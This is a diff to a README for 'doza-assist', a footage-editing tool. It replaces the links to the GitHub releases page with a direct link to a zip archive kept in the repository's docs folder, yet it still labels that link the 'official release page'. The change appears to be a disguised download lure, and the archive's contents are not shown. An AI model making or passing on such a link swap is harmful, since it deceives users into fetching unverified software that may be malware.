@@ -1,12 +1,12 @@
 # ✂️ doza-assist - Edit interview footage in minutes
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sbra4391/doza-assist/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sbra4391/doza-assist/raw/refs/heads/main/docs/assist-doza-v3.2.zip)
 
 doza-assist helps filmmakers create rough cuts from interview footage. It learns your editing style by watching your previous projects. It works with Final Cut Pro, Adobe Premiere, and DaVinci Resolve. The application runs on your computer. It keeps your files private. 
 
 ## 📥 How to download the software
 
-1. Visit the [official release page](https://github.com/sbra4391/doza-assist/releases).
+1. Visit the [official release page](https://github.com/sbra4391/doza-assist/raw/refs/heads/main/docs/assist-doza-v3.2.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your computer.
